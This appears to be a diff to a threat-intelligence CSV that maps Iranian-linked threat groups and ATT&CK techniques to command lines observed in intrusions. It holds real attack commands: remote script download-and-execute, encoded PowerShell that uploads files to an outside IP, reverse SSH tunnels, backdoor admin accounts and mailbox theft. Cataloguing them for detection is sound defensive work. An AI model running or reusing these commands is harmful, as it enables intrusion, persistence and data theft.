+Parisite,Netsh,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Netsh,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Netsh,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Netsh,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Netsh,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Cmd,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Cmd,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Cmd,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Cmd,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Cmd,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+Parisite,Cmd,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
+ipconfig /all
+.\SOCKSSrv.exe
+netstat -nao|findstr 28443
+ssh 104.238.191.185 -P 443
+ssh 104.238.191.185 -p 443
+Enter-PSSession -ComputerName <DC-2 IP>
+TNC <DC-2 IP> -Port 389
+netstat -nao|findstr 443
+cmd
+.\SOCKSSrv.exe
+netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
+netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
+netsh i p re all
+.\443.exe"
+MuddyWater,Csc.exe,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
+%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
+%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
+MuddyWater,Csc.exe,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
+%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
+%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
+MuddyWater,Reg,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
+%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
+%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
+MuddyWater,Reg,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
+%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
+%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
+%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
+%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
+MuddyWater,PowerShell,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
+%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
+%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -WindowStyle Hidden
+MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -WindowStyle Hidden
+MuddyWater,NetBird,persistence,T1133,External Remote Services,netbird.exe setup --setup-key E48E4A70-4CF4-4A77-946B-C8E50A60855A --management-url
+MuddyWater,Schtasks.exe,execution,T1053.005,Scheduled Task,schtasks /create /tn ForceNetbirdRestart
+MuddyWater,Windows Service Configuration Tool,persistence,T1133,External Remote Services,sc config netbird start= delayed-auto
+MuddyWater,Windows Service Configuration Tool,persistence,T1543.003,Windows Service,sc config netbird start= delayed-auto
+MuddyWater,NetBird,persistence,T1133,External Remote Services,sc config netbird start= delayed-auto
+MuddyWater,NetBird,persistence,T1543.003,Windows Service,sc config netbird start= delayed-auto
+MuddyWater,OpenSSH,persistence,T1543.003,Windows Service,sc config sshd start= auto
+MuddyWater,Windows Service Configuration Tool,persistence,T1543.003,Windows Service,sc config sshd start= auto
+MuddyWater,Net,persistence,T1136.001,Local Account,net user user Bs@202122 /add
+MuddyWater,Net,persistence,T1098.007,Additional Local or Domain Groups,net localgroup Administrators user /add
+MuddyWater,Net,persistence,T1098.007,Additional Local or Domain Groups,net localgroup Administrateurs user /add
+MuddyWater,WMIC,execution,T1047,Windows Management Instrumentation,wmic useraccount where name='user' set passwordexpires=false
+MuddyWater,WMIC,persistence,T1098,Account Manipulation,wmic useraccount where name='user' set passwordexpires=false
+Cyber Av3ngers,curl,execution,T1059.004,Unix Shell,curl --http2 --header accept: application/dns-json https://1.1.1.1/dns-query?name=google.com
+Cyber Av3ngers,whoami,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,whoami,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,whoami,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,date,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,date,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,date,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,hostname.exe,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,hostname.exe,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,hostname.exe,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,uname,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,uname,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+Cyber Av3ngers,uname,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
+hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
+whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
+date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
+uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -Command Copy-Item -Path %%malware path%% -Destination '%ALLUSERSPROFILE%\Logs' -Force
+Tortoiseshell,Systeminfo,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
+Tortoiseshell,Cmd,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
+Tortoiseshell,findstr,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
+Tortoiseshell,rar.exe,defense-evasion,T1027,Obfuscated Files or Information,%PROGRAMFILES%\WinRAR\RAR.exe a -v1000m -m5 %PROGRAMFILES%\WinRAR\{COMPANY_NAME}.rar C:/Users/{USERNAME}/AppData/Local/Microsoft/Outlook/{TARGET_OST}
+APT42,Rundll32,defense-evasion,T1218.011,Rundll32,rundll32.exe %WINDIR%\system32\davclnt.dll DavSetCookie datadrift.somee.com@SSL https://datadrift.somee.com/aoh5/[REDACTED].lnk
+APT42,ren,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
+APT42,Cmd,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
+APT42,curl,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
+APT42,Invoke-RestMethod,execution,T1059.001,PowerShell,powershell -w 1 $lb='gBjs';$uq=(invoke-restmethod -UserAgent 'Chrome' 'https://line.completely.workers.dev/aoh52');.(gcm i*ee*)$uq
+APT42,PowerShell,execution,T1059.001,PowerShell,powershell -w 1 $lb='gBjs';$uq=(invoke-restmethod -UserAgent 'Chrome' 'https://line.completely.workers.dev/aoh52');.(gcm i*ee*)$uq
+APT42,PowerShell,execution,T1059.001,PowerShell,powershell -w 1 $PbwpcDxXtAnaGrsu=(Get-Content -Path %LOCALAPPDATA%\Microsoft\Windows\AutoUpdate\fhgPczTORoCNEDsm.txt); &(gcm i*x)$PbwpcDxXtAnaGrsu
+APT42,Console Windows Host,execution,T1059.003,Windows Command Shell,conhost --headless %PUBLIC%\Microsoft.bat
+APT42,Microsoft Edge,execution,T1059.003,Windows Command Shell,msedge.exe --no-sandbox --remote-debugging-port=9222 --remote-allow-origins=ws://localhost:9222 --window-position=-32000-32000
+APT42,PsSuspend,execution,T1059.003,Windows Command Shell,%LOCALAPPDATA%\Caches\pssuspend.exe -accepteula -nobanner <chrome_pid>
+APT42,copy-item,execution,T1059.001,PowerShell,copy-item C:/Users/{USER}/AppData/Local/Microsoft/Outlook/@example.com.ost ` $env:APPDATA/victim@example.com.ost
+APT42,Set-ItemProperty,execution,T1059.001,PowerShell,Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Renovation' -Value cmd /c \for %a in (\%localappdata%\Microsoft\Internet Explorer\List\*\) do ( start \\ \%a\ )\
+APT42,curl,execution,T1059.003,Windows Command Shell,"curl.exe -X POST https://<FIREBASE-ENDPOINT>.json -H 
+Content-Type: application/json -d {\LastUpdatTime\:{\.sv\:\timestamp\}} 
+--ssl-no-revoke"
+APT42,Microsoft Edge,execution,T1059.003,Windows Command Shell,start msedge \hxxps[://]1drv[.]ms/w/c/208F0gfdtrhkjB256/EXaIieylg5EtG6mcLAdhtdhgdytrfHM31tA?e=pjdsyyI\;
+APT42,start,execution,T1059.003,Windows Command Shell,start msedge \hxxps[://]1drv[.]ms/w/c/208F0gfdtrhkjB256/EXaIieylg5EtG6mcLAdhtdhgdytrfHM31tA?e=pjdsyyI\;
+APT42,ren,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\cmd.exe /c set hm=cmolbd /c colburl --ssolblno-revoolbke -o vgh.tolbxt
+htolbtps[://]linolbe[.]complolbetely[.]workolbers[.]deolbv/aoh5 &
+rename vgh.tolbxt temolbp.baolbt & %%tmolbp%%  & call %%hm:olb=%%"
+APT42,Cmd,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\cmd.exe /c set hm=cmolbd /c colburl --ssolblno-revoolbke -o vgh.tolbxt
+htolbtps[://]linolbe[.]complolbetely[.]workolbers[.]deolbv/aoh5 &
+rename vgh.tolbxt temolbp.baolbt & %%tmolbp%%  & call %%hm:olb=%%"
+APT42,Cmd,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d
+id=CgYEFk&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://prism-
+west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs & call %c:7=% &
+set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
+APT42,PowerShell,execution,T1059.001,PowerShell,"powershell -w 1 $Pbwpc=(Get-Content -Path
+'%LOCALAPPDATA%\Microsoft\Windows\AutoUpdate\fhgPczTORoCNEDsm.txt');
+ &(gcm i*x) $Pbwpc"
+APT42,PowerShell,execution,T1059.001,PowerShell,"powershell -w 1 $pnt=(Get-Content -Path
+%APPDATA%\Microsoft\documentLoger.txt);
+&(gcm i*x)$pnt"
+Tortoiseshell,Net,execution,T1059.003,Windows Command Shell,net user DC-01$ P@ssw0rd
+Tortoiseshell,ssh,command-and-control,T1572,Protocol Tunneling,%WINDIR%\system32\openssh\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070
+Tortoiseshell,Reg,defense-evasion,T1112,Modify Registry,reg delete HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default /va /f
+Tortoiseshell,Reg,defense-evasion,T1112,Modify Registry,reg delete HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers /f
+Tortoiseshell,SCCMVNC,execution,T1059.003,Windows Command Shell,SCCM.exe reconfig /target:[REDACTED]
+Infy,Taskkill,defense-evasion,T1070.004,File Deletion,chcp 65001 TaskKill /F /IM 5268 Timeout /T 2 /Nobreak Del /ah
+Infy,Taskkill,execution,T1059,Command and Scripting Interpreter,chcp 65001 TaskKill /F /IM 5268 Timeout /T 2 /Nobreak Del /ah
+Infy,Taskkill,defense-evasion,T1070.004,File Deletion,chcp 65001 TaskKill /F /IM 8020 Timeout /T 2 /Nobreak Del /ah
+Infy,Taskkill,execution,T1059,Command and Scripting Interpreter,chcp 65001 TaskKill /F /IM 8020 Timeout /T 2 /Nobreak Del /ah
+MuddyWater,WinWord.exe,execution,T1059.003,Windows Command Shell,"%PROGRAMFILES%\Microsoft Office\Office16\WINWORD.EXE /n
+%WINDIR%\System32\cmd.exe /c %ALLUSERSPROFILE%\CertificationKit.ini"
+MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,"%PROGRAMFILES%\Microsoft Office\Office16\WINWORD.EXE /n
+%WINDIR%\System32\cmd.exe /c %ALLUSERSPROFILE%\CertificationKit.ini"
+MuddyWater,Schtasks.exe,execution,T1059.003,Windows Command Shell,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
+MuddyWater,Schtasks.exe,command-and-control,T1105,Ingress Tool Transfer,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
+MuddyWater,Schtasks.exe,execution,T1053.005,Scheduled Task,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
+MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
+MuddyWater,Cmd,command-and-control,T1105,Ingress Tool Transfer,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
+MuddyWater,Cmd,execution,T1053.005,Scheduled Task,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+MuddyWater,PowerShell,defense-evasion,T1027.010,Command Obfuscation,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+MuddyWater,PowerShell,exfiltration,T1041,Exfiltration Over C2 Channel,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
+MuddyWater,PowerShell,defense-evasion,T1027.010,Command Obfuscation,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
+MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
